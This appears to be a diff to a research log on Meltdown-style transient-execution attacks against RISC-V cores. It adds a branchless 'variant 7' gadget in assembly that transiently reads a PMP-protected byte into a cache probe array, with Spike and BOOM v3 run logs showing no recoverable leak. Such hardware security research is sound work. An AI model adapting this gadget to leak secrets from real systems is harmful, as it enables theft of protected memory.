@@ -1714,3 +1714,73 @@ This is negative. The target bucket is above threshold (`i53=260 > 257`), while
 several neighboring/control buckets are lower (`i51=251`, `i56/i50/i54=250`).
 Variant 6 therefore does not prove that the protected byte controls transient
 branch direction on BOOM v3.
+
+## Branchless Candidate-Select Variant 7
+
+`MELTDOWN_US_GADGET_VARIANT=7` removes the conditional branch from variant 6.
+It compares the transient byte with candidate `0x53`, turns the comparison into
+a mask, and uses that mask to choose between `probe[0x53]` and `probe[0x80]`:
+
+```asm
+lbu  t0, 0(secret_va)
+xori t0, t0, 0x53
+seqz t0, t0
+neg  t0, t0
+li   t2, 0x53
+li   t3, 0x80
+xor  t2, t2, t3
+and  t2, t2, t0
+xor  t2, t2, t3
+slli t2, t2, PROBE_SHIFT
+add  t2, t2, probe
+lb   t1, 0(t2)
+```
+
+If the protected byte transiently compares equal to `0x53`, the selected bucket
+should be `0x53`; otherwise it should be `0x80`. This diagnostic avoids branch
+prediction as the deciding mechanism and tests a short ALU-dependent selection
+chain.
+
+Spike smoke passed:
+
+```text
+MELTDOWN_US_PMP_FAULT=1
+MELTDOWN_US_MMODE_FAULT_SKIP=1
+MELTDOWN_US_GADGET_VARIANT=7
+MELTDOWN_US_DEBUG_ONLY=1
+MELTDOWN_US_TIME_REPS=8
+MELTDOWN_US_CAL_REPS=5
+MELTDOWN_US_ATTEMPTS=1
+meltdown-us: fault_mode=pmp-access
+meltdown-us: timing hit=68 miss=68 threshold=68
+meltdown-us: pmp training value=0x53
+meltdown-us: pmp deny armed
+meltdown-us: raw attempt=0 i53=68 i0=68 i80=68 i1=68 i55=68 i51=68 i56=68 i50=68 i54=68 i52=68
+meltdown-us: done
+SPIKE: PASS
+```
+
+BOOM v3 result:
+
+```text
+log: targets/boom/logs/MediumBoomV3Config-minios-meltdown-us-pmp-mskip-c1-var7-debugonly-r8-a1.log
+CPUS=1
+MELTDOWN_US_NPROC=4
+MELTDOWN_US_PMP_FAULT=1
+MELTDOWN_US_MMODE_FAULT_SKIP=1
+MELTDOWN_US_GADGET_VARIANT=7
+MELTDOWN_US_TIME_REPS=8
+MELTDOWN_US_CAL_REPS=5
+MELTDOWN_US_ATTEMPTS=1
+meltdown-us: timing hit=210 miss=276 threshold=243
+meltdown-us: pmp training value=0x53
+meltdown-us: pmp deny armed
+meltdown-us: raw attempt=0 i53=260 i0=388 i80=257 i1=262 i55=257 i51=257 i56=257 i50=257 i54=257 i52=261
+meltdown-us: fault recovery ok
+meltdown-us: done
+real 400.31
+```
+
+This is also negative. Both candidate buckets are above threshold
+(`i53=260`, `i80=257`, threshold `243`), so the branchless compare/select chain
+does not produce a recoverable secret-dependent cache footprint on BOOM v3.
